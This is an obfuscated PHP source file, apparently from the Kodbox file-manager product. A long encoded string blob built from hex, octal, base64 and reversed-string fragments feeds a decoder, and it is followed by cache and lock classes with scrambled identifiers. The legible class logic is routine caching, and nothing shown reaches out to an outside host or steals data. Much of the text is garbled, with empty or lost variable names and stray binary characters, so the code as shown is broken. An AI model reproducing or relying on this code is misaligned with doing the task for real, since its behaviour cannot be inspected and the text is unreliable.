xdd\xfe\x88\xd9\x5a\x20\xce\x6c\x4\x63\x9d\x95\x3d\x1c\x30\x92\x5a\x1c\x12\x6c\x6f\x71\x88\xeb\x58\x64\x5d\x2c\x5\xde\xbd\x45\xcc\x92\xb8\x6\x78\x40\x0\xa5\xb5\x8d\x33\x2d\x2d\x30\xff"."\154\33\117\112\357\237\270\274\113\310\117\56\150\345\162\173\36\367\301\265\100\135\240\254\34\141\4\162\0\153\240\310\272\55\40\333\243\152\256\1\224\34\246\54\134\216\347\267\105"."\x88\x4f\xe0\x80\x34\xb5\xae\xea\x72\x8c\x5c\xdb\x6c\x3d\x14\x34\xdb\x59\xe1\x72\xc2\xf3\xad\x8e\x8d\xb1\x7b\x89\x2e\xce\xa6\x72\xe\x29\x68\xda\x76\x10\x3b\x3\x24\x7c\x21\xd7\xdd\x4a\xa4\xd8\xad"."\205\273\57\364\225\31\351\170\11\376\310\270\123\136\356\262\127\370\365\245\302\146\32\216\160\27\52\210\275\15\15\142\257\31\146\211\275\243\21\31\53\233\266\56\173\214\316\351\304"."\x39\x25\x37\x20\x97\x7c\x2e\x17\xb5\x31\xbc\x58\x98\x7a\x9b\xe4\x7d\x19\x31\x4c\x83\x7c\x14\x89\x5f\x59\xd9\x47\x20\x1e\x3a\x7f\xd1\xe5\x64\x7f\xcc\x8f\x6\xc1\xe3\xd3\xd8\xd6\xf5\x21\xa6\x8e\x27"."\x31\xbd\xfc\xc0\xdb\xcd\x7d\x15\x7b\x3b\x86\x91\x58\xac\x60\x8b\x3b\xaa\xa6\x37\x96\xfe\x9a\x0\xbf\xa4\x8e\x47\xf1\x58\xf2\xf5\x8e\x1b\x7\x47\xe1\x3c\x19\x1b\x76\x46\xa6\x3f\x47\xd6\xea\xab\xdf"."\x12\x2e\xa3\xd1\x5c\xd2\xa7\x1b\x96\xeb\xe3\xcc\x1d\xb3\x87\xac\x78\x3c\x38\xf7\x2d\xed\xeb\xea\x4b\xcb\x83\xe3\x58\xda\xc0\x0\x6a\xac\xe4\x2b\xd4\xd5\x16\xe1\x30\x1a\xd0\x8f\xbc\xb6\xc0\x86\x60"."\162\167\323\40\216\77\274\246\267\152\110\44\274\155\20\345\300\6\370\243\234\133\10\222\147\133\152\340\356\21\30\16\330\73\40\364\102\313\25\351\345\40\31\137\360\216\300\137\173"."\301\147\142\352\332\233\21\172\342\174\33\336\77\150\145\75\102\103\127\152\63\231\131\316\272\72\204\211\165\55\165\123\32\320\157\143\235\257\16\263\75\44\216\161\21\3\110\73\352"."\x5a\xa6\x34\x90\x40\x23\xf8\x3f\x99\x0\x73\x5\xc9\x2d\xaa\xb8\x3\x6\xf1\xce\x62\x34\xb4\xd2\xc5\xc5\x62\x32\x1a\x78\xed\xcf\x8\xce\x8\x8e\x2\x3d\x58\x3c\x8c\xbf\x28\x1e\x31\xf1\x3a\xa8\x1e"."\123\265\342\4\23\310\253\262\23\146\160\357\14\243\56\247\164\362\226\60\367\314\135\141\250\176\225\77\324\165\244\137\70\52\136\270\170\254\130\120\340\74\323\132\337\34\150\252\127"."\xd8\x23\x37\xad\xf5\x3d\xe9\xe\xff\xbc\xfa\xc5\x8b\xf6\x5a\xd8\x4e\xae\x31\x1d\xbd\xb\xdf\x43\xe2\xd3\x36\x3d\x66\x2e\x82\x6b\x86\x85\x78\x51\xf1\x48\xd0\x1d\x9b\xac\x2c\xe0\x5f\x51\x9b\x30\x4b"."\332\250\215\50\124\61\220\225\336\300\21\10\320\303\151\232\160\31\136\322\235\121\323\202\33\133\140\326\146\64\315\222\61\34\20\306\146\313\233\10\72\132\260\234\216\15\106\117\171".base64_decode('vFLy46OvPyU7uPM80tDkzo8Pr+78MqHMChJSFEH6JkeLIj/UIvnpJYIRukaZ8gHAMA==').base64_decode('DWUgQU8HhK46Jouqmywu8bQXD7wfcQl4NaAl5hiSk205i/upD+8DIN5RIEXwVPvlxw==').base64_decode('R8YQK4eTsWd9P55tv5GbLEXMcM2mZgFxamXpqRg57yfJJbm/UmEfrFmpzGiyDKQTUQ==')."\136\237\354\253\35\37\304\375\374\116\300\353\12\136\60\347\132\265\337\172\264\224\225\31\63\133\146\317\107\377\3\261\144\167\374\225\62\123\21\106\101\346\327\376\260\340\0\243\12"."\342\355\17\326\67\74\341\322\103\0\56\260\30\106\276\336\31\71\161\345\23\255\165\75\74\3\35\245\147\103\351\301\2\42\311\245\53\11\153\276\250\374\205\207\32\164\25\161\371"."\154\373\200\255\127\222\176\362\11\31\144\1\213\347\327\304\22\311\24\206\104\117\62\130\33\32\60\174\10\65\324\24\314\26\331\166\145\161\150\276\122\32\152\225\22\25\307\64\225"."\242\126\32\7\136\166\252\335\62\325\136\200\77\324\212\365\300\355\251\354\45\16\341\345\25\357\52\302\177\37\365\104\3\51\124\156\35\300\257\321\4\360\226\225\254\110\64\112\105"."\173\223\347\272\124\176\316\257\233\74\163\2\273\30\175\362\4\22\142\75\113\243\161\111\207\107\2\250\355\341\270\32\352\356\256\231\300\371\32\54\273\302\27\340\201\265\354\136\40"."\313\20\157\241\121\34\124\262\330\366\240\265\16\103\353\24\333\312\62\167\270\165\101\40\274\44\203\20\246\56\64\240\110\75\56\242\14\240\76\371\111\210\46\327\57\132\30\64\26"."\xf1\xf9\x10\xae\x81\x2c\x53\x98\x56\x4\x82\x3f\xc5\xc7\x85\x20\xd6\x92\x29\x1d\x8e\x11\x40\xbe\xb4\x27\xd0\xe\xe1\x8\x48\x51\x16\x6a\xa\x1d\xea\xd6\x7a\x22\xa2\xad\x57\xf2\x68\x3\xe7\x2a\x82".base64_decode('i7yF4+zmZGFQkxPx4kuajF/mp4QR7uquppQ9JDnPJo9ltGulFdVFcOWBrJxEZ5IYfw==')."\124\347\17\222\123\150\120\34\210\124\372\106\133\355\333\12\56\304\257\201\43\370\232\34\255\2\166\77\251\145\207\60\36\212\115\3\232\1\11\335\370\170\103\23\134\357\4\70\222"."\xe2\x42\x5\xdb\x46\x11\x91\xb0\x25\x1e\xed\x59\xb7\x8e\x56\x84\xb9\x86\xd\x1b\xaa\x61\xa0\xfb\xe8\x4d\xa\x95\xd\x2f\x8\x23\x93\x17\x86\x8f\x99\x2\x86\x76\x3f\xf7\x67\x28\x22\xcb\x99\x4\x84"."\345\241\277\242\114\54\276\124\104\350\152\163\45\366\62\65\143\22\353\353\255\17\114\333\260\41\150\60\15\41\246\315\300\312\6\170\156\32\357\13\270\363\243\236\300\320\363\214\0"."\360\346\244\74\350\62\130\217\173\5\247\11\173\56\256\11\244\140\365\240\326\326\105\275\374\302\243\237\245\61\106\322\150\236\307\120\140\42\357\117\257\344\301\366\270\140\225\71\336".strrev('<j!e²'."\0".'	&FKYYr@lxbېR S')."\4\154\260\101\300\43\210\204\42\136\155\255\27\216\352\342\100\36\130\150\147\55\243\354\270\110\27\175\245\262\216\274\227\263\126\33\321\150\226\72\5\316\366\255\165\304\215\174\35"."\42\125\64\5\150\204\150\312\102\114\223\24\113\57\264\326\221\346\332\171\135\107\345\11\325\251\365\21\124\260\116\141\4\263\250\361\21\263\34\23\155\227\334\264\6\136\357\352\111"."\x82\x81\x40\x28\xe\x37\x10\x3f\x3d\x8a\xfe\x4e\xf9\x29\xdf\x1b\xf0\x33\x73\x5\xdd\xa2\xea\xcf\x84\x2\x91\xbb\xaf\x1\x2c\xb3\xa1\x99\xe0\x15\xb1\xee\x64\x22\x9d\x68\x67\x4f\xd\xb9\x85\x3b\x14"."\x36\x8b\xb1\xbb\x36\x35\x1d\x13\x87\x24\x66\xc4\xc2\xb5\x4\x58\xe\xce\x40\x4\x1\x2\xf3\x6e\x55\x4a\x25\xae\x70\x85\x39\x4a\xbe\xcb\x91\x23\xb4\x9e\xb\x28\xbd\x1a\xbb\x13\x1\x91\x12\xbd\xe4".base64_decode('SeUrjtg5seP5NLaPtQEsufDDDgRRRb3USre1idkkMH0tYR+FlUbUZalEnL0XApsksQ==')."\xc4\x69\x8f\x45\x23\xf1\xb4\x1a\x85\xfd\xb1\x79\xc6\xdc\x40\x93\x30\x8f\xa1\xce\x48\xdb\xf9\xd\x3d\x7c\xb4\x46\x73\xa8\x8\x33\xcd\x55\xab\xf4\x92\x4b\xe4\x42\xbb\x51\x30\x99\x83\xc4\x19\x4d\x4d".base64_decode('Tf6mZvQ/Uw5mbtlamHMIKUtTUwv5nyYQCSPMozsF0QtG6CDDqK5Dg2BjKRqlCuPbeg==')."\xdb\xb1\xb9\x94\x82\x9b\xd6\xcf\x58\x15\xd6\x7e\x34\x85\xc4\x6f\x21\xa3\x39\xae\xf7\xca\x14\x72\x8f\x6\x31\xdd\x3b\x8\xfc\x82\x12\x90\x82\xed\xe7\xd4\xff\x2c\xdb\x47\x50\x43\x6\xc9\xa0\x40\x7b"."\xb9\x7d\x1e\xca\x26\x50\x6f\x1\x35\x8d\x6c\xe5\x8d\x8a\x94\x72\xbd\xf2\xc7\x2\x6c\x70\x29\x50\x38\x5f\xf6\xb3\x4\xbf\xfc\x0\x2\x14\xa2\xbb\x89\x10\xc1\xbb\x9a\x86\xca\xb8\x1d\x22\x62\x8\xda"."\350\263\274\237\30\40\11\146\60\57\50\71\171\304\121\131\322\116\222\271\221\33\211\25\270\35\76\216\306\171\115\364\235\15\152\150\6\143\130\3\363\363\346\250\52\66\156\34\135"."\306\143\144\110\361\251\214\241\141\116\62\104\304\343\312\110\270\224\235\13\263\304\55\72\50\5\20\343\364\41\243\340\62\311\125\245\242\362\330\56\300\31\131\117\322\356\222\270\42".strrev('LS4̩VS,d;\\[-HQ*ǼBD').strrev('E%/HUvë="nux'."\0".'WDO$Ros'."\0".'0').strrev('vt.5|@dk9w-s-`tVp[М').base64_decode('eDlZyirsQSWgezVLCe38USAZiA+Ast4DYbnddeCTpRvCW/YNSMckAg48cyvr8NFsgg==')."\x22\x61\x69\x8d\x2c\x57\x56\x5d\x68\xc2\x70\x95\xa9\x59\xe0\x11\x12\xf7\x9a\x6e\x38\x85\xd1\x33\xbb\xeb\xbe\x25\x4d\x8\x5d\x41\x67\xaf\xee\x2\x29\x24\x8b\xa\x57\x10\x63\xaf\x47\xa6\x5c\xbe\x83"."\x1\x4d\x61\xe9\xb6\xb6\xca\xc5\xdc\x69\x6f\xfd\xec\x2c\x16\x38\x87\xe5\xc2\xc3\xca\x5\x90\xb2\x3c\x1e\xf\xa9\x2a\x8b\x53\xf0\x8a\xee\xe4\x2f\xb9\xd6\x40\x44\x37\xb2\x55\x61\x15\x61\x35\x70\x5"."\55\234\24\112\61\134\73\20\62\37\72\64\332\124\362\347\303\140\205\76\157\252\224\164\156\115\355\236\124\271\0\74\315\143\42\26\14\273\126\225\13\341\272\172\74\44\152\271\213"."\42\362\266\366\222\306\62\25\60\145\152\140\6\250\247\115\145\176\371\51\75\26\227\226\101\350\166\57\352\126\77\72\7\210\335\4\46\244\227\122\143\126\47\156\62\204\162\154\176"."\x14\xf7\xee\x2a\xed\x15\x8a\x5c\x11\xda\x75\xd3\x79\x2c\x9\xe9\x57\x48\x33\x17\x10\xa7\xee\x35\x52\xb1\xe5\x3a\xfb\x1a\x77\x33\xb\x94\x1f\xe5\x31\x1d\x7e\x76\xc4\xd5\x23\x54\x16\x91\x98\xcc\x24".strrev('wd*(4q!.Q=g.qʈX׍`Eg]T"i')."\204\13\305\56\22\24\4\370\255\13\177\306\2\47\11\74\112\111\372\100\65\332\7\265\362\72\161\13\112\102\257\14\30\30\113\317\232\26\221\233\110\16\41\112\116\122\37\224\243"."\61\223\313\213\360\305\135\255\52\260\17\36\211\354\340\125\30\312\72\25\331\243\217\344\247\34\305\44\267\363\22\43\352\157\126\70\7\253\322\232\151\144\272\224\100\362\327\142\146"."\75\202\115\311\50\203\10\152\122\225\14\277\155\362\260\230\314\316\103\221\71\70\146\270\201\53\40\316\125\160\17\154\71\15\125\213\135\2\213\236\311\105\310\67\253\212\320\64\314".strrev('} v#dgou	#w,I$SRYr%	D')."\55\54\11\15\360\31\221\221\61\320\47\204\174\42\217\51\335\331\21\267\45\302\101\3\361\320\302\347\223\270\162\341\61\113\342\45\164\256\153\110\174\232\310\144\135\250\2\120\25"."\x44\x9c\xa1\xa7\x56\x3a\x1d\x21\x9c\x1c\x76\x29\x8d\x7a\x32\xa0\xf5\xe1\x4e\x7\x97\xf3\xa2\x31\xd4\xad\x8a\xe9\xd2\xe5\xf1\x54\x2\xcf\x17\xc8\x4e\xf5\x49\x29\xd1\xf\xa1\x39\x8b\x40\x26\x75\x6c".strrev('*i7OF#sulFcIT%c-Z96r\'0j^ޠiP'."\r".'/')."\152\313\21\226\312\221\323\166\105\250\376\224\253\64\7\361\134\243\72\263\164\145\42\243\356\316\356\40\7\265\361\345\111\245\15\302\311\124\73\123\122\322\307\164\70\340\215\26\215".strrev('$U?N?$oXgҚ2O Њ;2jhb,K').base64_decode('+S09IuWuluKfblXVWMIGLIWqMlgUXCN3QYhBpcxlS6/OP65jtSGpxVKBSo3WQP7aXw==').base64_decode('IO9XyLkRI6SXJmu8URoxbEMsfFZiXK49FO6KxtVQLJZY6dK2E0Jwiz8OkpPfEpFmRg==').base64_decode('TAL9erXvM/AcJfts94hR6PTJbvDK7NYHHjzkjw7QqPTwT9nSDFuXAPSJmmlgL6IVCg==').base64_decode('rmf8CgNStOLeWWt+SqUfYDDJ5V6tDMno0s70/7ipRk64uzJyTAGFm/fR9wja5Scf2Q==').strrev('~`'."\r".'1\\/ O}JaN9&l{؀N%L|g77')."\21\166\73\206\43\342\140\202\263\103\155\370\163\364\270\212\116\341\130\176\307\216\60\114\173\22\321\11\30\147\327\105\275\347\301\247\157\174\133\240\352\33\344\161\1\232\326\213\273"."\x83\x72\xf6\x8b\xce\xa1\x18\x7f\x59\x44\x14\xf5\xa6\xd4\x68\x0\x4a\x56\x84\x4c\x8b\x67\x50\x5a\x95\x26\xfa\xf6\x18\x7f\x35\x42\x59\xc8\x8c\x95\xc5\x7\x88\xef\xad\x48\xb1\xec\xb8\x8e\xf2\x9d\xb2"."\302\271\64\67\24\100\70\35\161\124\303\12\125\146\161\274\12\340\22\144\305\130\273\270\222\40\176\63\243\64\140\312\343\107\10\62\266\36\240\157\4\122\231\201\17\35\35\164\247".base64_decode('+oEhWvz/pCBNTEnOFt2VVDfI9m51gu3CbyflzVH3w4EY4n0tyfVOkrRoiE2t/LKTuw==').base64_decode('kK/q7RKFvPmqIFSHWcSOmNiZlGSWPj2V/vTBL9vOvI2ghAo+2ciRqj1vFHIW1xASgA==').base64_decode('Ll0ICkgprCSjsbdtyaNqYUaT4bmUWk9oYZ967ldfxGM6Yu90Py7Cb7ZtsRhsx/WcTQ==')."\xda\x4c\x6b\x83\x3e\xca\x91\x61\xaa\x26\x62\x6d\xe3\x72\x58\x56\x5c\x25\xbd\x40\x89\x4c\x98\x97\xe3\xf3\xbd\x48\xca\xc0\x5e\xa5\xcb\xf9\xc8\x8b\x69\x94\xd4\x79\xdf\x63\x91\x56\x1a\xa7\x9f\x72\xe9"."\xc1\x82\x99\xd1\xa\x49\xaa\x58\xe7\xb2\x35\xb1\xd0\x69\x4a\x67\x7b\x80\x2b\x1b\x5\x5\xb5\x72\x59\xdc\xa1\xc9\x5b\x26\xfa\xd7\x65\xfb\x7\x69\x3d\xe9\x4e\x95\x58\xb0\xab\xf4\x1e\x3e\x25\x70\x4e"."\272\175\243\100\270\211\253\224\242\364\102\303\5\265\244\163\236\354\246\224\336\71\12\153\63\310\216\332\331\115\57\31\141\300\344\52\331\305\57\27\211\167\110\157\240\7\253\57\212"."\261\312\40\120\24\362\266\262\120\253\40\326\345\362\101\14\62\50\13\25\201\32\256\205\214\121\11\161\303\364\115\72\102\51\144\306\375\33\240\322\133\101\360\366\135\255\247\177\50".strrev('ss0߅篾yƯKx-N{WK>2Їw6.85>')."\77\231\214\373\301\131\3\176\156\250\72\172\170\117\35\174\130\75\5\222\336\101\116\233\325\362\141\161\225\356\172\375\117\352\65\220\266\352\27\4\245\141\220\372\135\261\12\76\242"."\125\340\143\136\354\152\76\102\350\172\337\310\73\241\65\236\61\374\326\12\101\237\231\34\272\162\156\252\327\262\60\143\261\153\132\157\66\303\205\273\252\245\13\23\30\352\216\264\152"."\203\130\135\314\315\230\71\173\276\54\334\20\123\50\356\72\231\163\175\372\3\334\212\100\12\305\215\206\12\363\201\52\257\176\222\350\126\61\257\176\362\322\263\3\374\317\26\214\70"."\75\320\254\222\342\167\365\343\300\125\43\100\360\124\122\202\222\66\104\217\376\212\211\125\112\154\261\352\350\26\50\336\271\164\177\213\262\17\65\372\41\355\173\142\261\320\167\12\315".strrev('(D\\ 1ѮJM 02vo;ֲ4c>')."\x15\x60\xdb\xc6\xa6\xd4\x62\xb5\x49\x94\xe8\x7f\x30\x81\xec\x8c\x44\x8f\x53\x42\x99\xa9\x46\xcf\x83\x4b\x18\x69\xa9\xf1\xe\xa5\xa4\xfe\xf1\xd\xed\xa6\xdc\x1d\x3f\xf\xfa\x35\xc7\x2f\x21\xa4\x24".base64_decode('PtSdBJlgIBHi2Oruq6d6VEzU0e9TJstUzeJJz1UKZ1sSc4dLMzvKSU79xIzPzSbJzw==')."\xec\x11\x53\x38\xe1\x5b\x82\x2c\x57\xd7\xd2\x95\xdc\xc\xcb\xa6\x64\xa4\x22\x79\x4d\x54\x57\x2d\x3d\x5a\x28\xa4\x42\x44\x8c\x4\x3d\x82\x5\x4d\xd4\x18\x48\x33\x43\x4b\xb9\x5\xa2\x26\x69\xa3\xb9".base64_decode('RVV4qKVnZ005LKYAk/0Ec9iKvu46aqJ42PMmMSFR3oeK2RARuiBInmTI6jrX8JfaXA==')."\347\34\333\373\166\43\342\366\144\7\314\50\352\175\341\26\150\43\261\23\240\137\223\166\127\261\221\212\120\274\122\24\21\111\276\113\216\124\74\321\145\357\213\75\110\171\310\0\263".base64_decode('IrY9L7dSd7g0zDj//+tnC/9fvVY4u4lJ4l0PGy8F/puxfBOS+20qBfb0w72D7glYxA==').strrev('_h{/l|.׈h!B,dR[>'."\n".'v4cy\\')."\x2b\xa3\x20\x43\xfc\x60\x54\x3\x8f\x29\x88\xf1\xc3\xd2\x13\xe2\x46\x76\xa8\xc6\x55\x36\x51\xe8\x74\xbb\xaf\x96\xf8\x8f\xaa\x6c\xa2\xd\x88\x4d\x61\xee\xd9\x82\x2c\x94\xc5\x27\x42\xe2\x1b\x1\x46"."\117\66\143\115\224\331\331\261\21\210\176\377\22\106\234\210\315\74\320\50\231\56\271\100\125\324\54\355\232\23\27\120\36\156\230\103\154\10\314\246\323\125\242\313\363\114\46\315\144"."\xcb\x63\xeb\x92\xde\x57\x6b\x36\x54\x97\xe6\x74\x40\x2e\x82\xb5\xce\xdd\x2\x2d\xfe\xc0\x79\x93\xf7\xc5\xf3\x66\xbf\xa7\x3a\xfe\x52\xa8\x1b\xd7\x5d\xaf\x55\x52\x6d\x10\xb4\x40\x92\x58\xca\xc1\xe4".base64_decode('VuQCiNwE+6vLULxOiTyTrKza65s3SgjxcEgeD0Ynui2T8IJuKJf8SKq90qvdVewdBQ==')."\117\15\124\155\122\214\144\272\146\12\235\376\304\305\243\141\22\67\370\254\150\117\127\3\61\202\2\104\107\7\222\16\123\240\214\364\154\66\136\230\302\203\44\126\144\46\62\110\231"."\17\140\166\211\222\42\77\200\134\222\102\133\176\161\304\135\22\233\146\270\227\340\242\132\331\262\246\145\113\331\70\274\126\136\214\230\262\44\104\116\303\117\36\73\256\51\22\57\32".base64_decode('eF8yIPIBeuR3nfzhqlgGSVeniH3PuZ9GIYkEzJyNQg3S5Z/77pX7bK8itxUjJiWTUg==').strrev('^|1XVbPq#!jnZKxƈЍk$Q').base64_decode('693wAW1EcFqCu8/lOrSRGllz7HzDoQjCsxJOTTJfFkYD+qj3YeWAbPLsylgNFebNUg==')."\x79\x71\x2d\x23\xba\x89\x61\xb5\xba\x4f\x16\x9a\xbb\xb8\x6c\x3e\xcd\x91\x4a\x80\xe8\xe3\x16\x5c\xad\x41\x3a\x49\x61\xbd\xf\xa1\xef\x40\xbb\xc2\x5\x6\xe2\x93\x6e\x63\x6d\x9e\x8d\xcf\x19\xca\x43"."\254\221\374\56\250\347\154\210\145\63\214\355\360\44\331\362\243\310\356\13\130\131\202\41\241\200\136\210\111\325\311\227\263\223\26\110\325\376\210\300\112\367\20\113\126\356\42\201\355"."\220\246\153\360\45\22\311\73\6\71\223\162\242\253\71\336\251\45\307\32\201\276\24\130\44\202\141\232\26\162\47\321\374\272\247\365\162\1\157\317\150\11\173\324\160\262\171\351\254"."\x55\x9d\x58\xd\xb7\xaa\x6\x15\x3e\x54\xbb\xbd\xde\x56\xb1\x31\xf5\x9e\x40\x45\x25\x55\xed\x91\x34\x3c\xd2\x66\x8d\x32\xb4\x45\x35\x8b\xd1\x24\x5c\x52\xf0\xbc\xae\xb2\x93\xc\x1\x2e\x4b\x93\x70".base64_decode('2apkVlgS2EjlHK1iT9K96sEDKUauRoc9Z32adbLxrJm5+nOAcd7cROxRuxVCWuG5aQ==')."\xaf\xd5\x8a\x9a\x99\x27\x6d\x85\xc8\xed\xd9\x5\x6a\xd1\x5a\x96\x52\x83\xba\x52\xca\x31\xa9\xf6\x89\xd0\xc8\xa8\x26\xf3\x22\xad\x86\x7e\x8\xfd\x24\xde\xc2\x65\x57\x56\x35\x92\x65\x65\x93\xda\xea".base64_decode('KMmalMF264l44PK4gYdUYL4AGdFptGAMCT08poY/1UX+K6Whksm3lJxQs8Qq4iHLOw==').base64_decode('zlW1udG4VJGczta0CvBh2UH1Kb2gsasGyZyCHqtMx8jqbs+2skcrms4+UpCEkR45oA==')."\220\144\270\364\30\152\110\312\10\10\330\76\41\222\247\365\111\14\215\300\11\227\345\13\145\43\340\46\203\136\202\266\343\313\166\176\375\105\274\262\322\155\227\46\247\114\313\361\341".base64_decode('tLRZJr9tpuMIpQAqOiC8It47fZLOCwqJuy7cKHKJQtCWUB8ShOtYfCZP6TSV0CxXBA==')."\x5f\xce\xf0\x88\xbc\x35\xc2\xb5\x6c\x47\xc5\x73\x71\x2c\x0\xe8\x0\x9c\x31\xc7\x98\x1b\x29\x6c\x8e\x2f\xda\x23\xae\x6f\x34\x2f\x3f\x28\x58\x19\x40\x45\x59\x83\x87\x38\x3d\xb0\x83\x34\x25\x8\xef".strrev('*ca&VJԕU:T["tӨ*m5jUym`[6I&')._kodDe('MYGGIX+Xj6d/ACi23g+/jkqZVfoXPBhCsn3OE3moMhg2+rZR0XWaHKMaBGQOz8qNU4k=')."\67\231\300\237\335\234\244\264\2\223\3\110\206\271\172\121\170\242\23\145\334\342\15\171\136\155\346\62\222\7\334\17\26\171\164\24\31\302\102\105\130\361\51\16\165\47\313\0\305".base64_decode('Puf5uuc8t7i8D7gu+SU4WRuE2Eg4J+/JBDCt5gDJUuXqWw6SKgYAN2yZCVpza82MdA==').base64_decode('i0FPPGAJC0MqKbfRsCvZ0QZr3nVT6SFe/UKu978B9yosJHeuAAA=').base64_decode('').""."", 10, -8))); goto bӏɪ; aԝ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ŧ =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ծ = $GLOBALS[$ŧ[6]][$ŧ[393]]; $帥 = $ծ[$ծ[$ŧ[861]]]; $ = $ծ[$ŧ[862]]; switch ($ծ[$ŧ[861]]) { case $ŧ[21]: self::$handle = Model($ŧ[863]); break; case $ŧ[864]: self::$handle = new CacheRedis($帥, $); break; case $ŧ[865]: self::$handle = new CacheMemcached($帥, $); break; case $ŧ[214]: self::$handle = new CacheFile($帥, $); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($۟) { if (is_array($۟) || is_object($۟)) { $۟ = json_encode($۟); } $۟ = rawurlencode($۟); return md5(KOD_SITE_ID . $_SERVER[][11] . $۟); } public static function get($, $ = false) { $ = self::key($); $ = self::init(); if ($) { return unserialize($->get($)); } if (!isset(self::$memoryCache[$])) { $ = $->get($); self::$memoryCache[$] = unserialize($); } return self::$memoryCache[$]; } public static function set($Ԗݚ, $䨔, $쀧 = false) { $だϭ =& $_SERVER[]; $ = self::key($Ԗݚ); if (isset(self::$memoryCache[$]) && self::$memoryCache[$] === $䨔) { return !0; } if ($쀧 === 0) { self::$memoryCache[$] = $䨔; return !0; } $ؒ = self::init(); $ë = serialize($䨔); CacheLock::lock($Ԗݚ . $だϭ[866]); $򶞹 = $ؒ->set($, $ë, $쀧); self::$memoryCache[$] = $䨔; CacheLock::unlock($Ԗݚ . $だϭ[866]); return $򶞹; } public static function getCall($³, $Ȃ, $, $­ = array()) { $ԃ =& $_SERVER[]; $ = self::get($³); if ($ || $ === $ԃ[12]) { return $; } $ = call_user_func_array($, $­); $ = $ ? $ : $ԃ[12]; self::set($³, $, $Ȃ); return $; } public static function remove($) { $ʲ = self::key($); unset(self::$memoryCache[$ʲ]); self::clearTimeout(); CacheLock::lock($); $ = self::init()->remove($ʲ); CacheLock::unlock($); return $; } public static function removeMemory($ǐ) { $۬ = self::key($ǐ); unset(self::$memoryCache[$۬]); } public static function clearMemory($؈ = false) { if ($؈) { $؈ = self::key($؈); unset(self::$memoryCache[$؈]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][867])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][868])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ƚ, $) { $蜲 =& $_SERVER[]; $this->cachePath = $ƚ[$蜲[84]]; $this->prefix = $蜲[869]; $this->cacheTime = $; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($) { $ =& $_SERVER[]; $ = str_replace(array($[870], $[97], $[73]), $[871], $); return $this->cachePath . $[872] . $ . $[873]; } public function set($޸, $䰍, $ƾ = false) { $ƾ = $ƾ ? $ƾ : $this->cacheTime; $ = $this->getFile($޸); if (file_put_contents($, $this->prefix . $䰍, LOCK_EX)) { @touch($, intval(time() + $ƾ)); clearstatcache(); return !0; } @unlink($); return !1; } public function get($) { $袻 = $this->getFile($); if (file_exists($袻) && filemtime($袻) < time()) { @unlink($袻); return !1; } $ܤ = @file_get_contents($袻); return substr($ܤ, strlen($this->prefix)); } public function remove($㲆) { $ = $this->getFile($㲆); return @unlink($); } public function deleteAll() { $¹ =& $_SERVER[]; $ = scandir($this->cachePath); foreach ($ as $ͽ) { $Ъ맃 = $this->cachePath . $ͽ; if (strpos($Ъ맃, $¹[873]) && strpos($Ъ맃, $¹[874])) { @unlink($Ъ맃); } } } public function clearTimeout() { $Э =& $_SERVER[]; $ = scandir($this->cachePath); foreach ($ as $) { $貇 = $this->cachePath . $; if (strpos($貇, $Э[873]) && strpos($貇, $Э[874]) && filemtime($貇) < time()) { @unlink($貇); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $șҝ =& $_SERVER[]; if (self::$handle) { return self::$handle; } $賽 = $GLOBALS[$șҝ[6]][$șҝ[393]]; self::$timeout = $賽[$șҝ[875]] ? $賽[$șҝ[875]] : 10; $ꢻ = _get($GLOBALS[$șҝ[6]], $șҝ[876]); $ = $賽[$șҝ[861]] ? $賽[$șҝ[861]] : $șҝ[214]; if ($ == $șҝ[21] && $ꢻ == $șҝ[13]) { $ = $șҝ[214]; } switch ($) { case $șҝ[864]: self::$handle = new CacheLockRedis(); break; case $șҝ[865]: self::$handle = new CacheLockMemcached(); break; case $șҝ[21]: self::$handle = new CacheLockDatabase(); break; case $șҝ[214]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($șҝ[877], $șҝ[878]); } return self::$handle; } private static function key($؋) { return $_SERVER[][879] . Cache::key($؋); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ = '') { self::$errorMsg = $; } public static function lockGlobal($, $) { return self::lock($, $, !0); } public static function lock($, $ۼ = false, $˛ = false) { $Ҥ =& $_SERVER[]; $ = self::init(); $њƓ = self::key($); $ۼ = $ۼ ? $ۼ : self::$timeout; $ = timeFloat(); $ = $->lock($њƓ, $ۼ); $鳦 = timeFloat(); if (!$) { $Ѐ = "\x6c\x6f\x63\153\x20\145\162\162\157\162\73\x6b\x65\x79\x3d{$}\73\164\x69\155\145\x3d{$ۼ}\x3b" . self::$errorMsg . $Ҥ[71] . get_caller_msg(); $ = LNG($Ҥ[880]) . "\x28{$ۼ}\163\51\x2e" . LNG($Ҥ[881]); $ .= $Ҥ[882]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ = $ . $Ҥ[883] . self::$errorMsg; } write_log($Ҥ[884] . sprintf($Ҥ[885], timeFloat() - $) . $Ҥ[886] . $Ѐ . $Ҥ[887] . error_get_last(), $Ҥ[878]); show_json($, !1); } if (!$˛) { self::$lockItem[$њƓ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ = number_format(timeFloat() - $鳦, 3); write_log($Ҥ[888] . $ . $Ҥ[889] . $, $Ҥ[878]); } return $; } public static function lockGet($،Շ) { $倱 = self::key($،Շ); if (self::$lockItem[$倱]) { return self::$lockItem[$倱]; } return self::init()->lockGet($倱); } public static function unlock($ɾڣ) { $ =& $_SERVER[]; $ = self::key($ɾڣ); self::$lockItem[$] = null; self::init()->unlock($); if (GLOBAL_DEBUG_LOG_ALL) { write_log($[890] . $ɾڣ, $[878]); } return; } public static function unlockRuntime() { $ݼ =& $_SERVER[]; $ӭ = self::init(); $׻ = !1; foreach (self::$lockItem as $ => $Ճ) { if (!$Ճ) { continue; } $ӭ->unlock($); if (!$׻) { $׻ = !0; write_log($ݼ[891] . $ 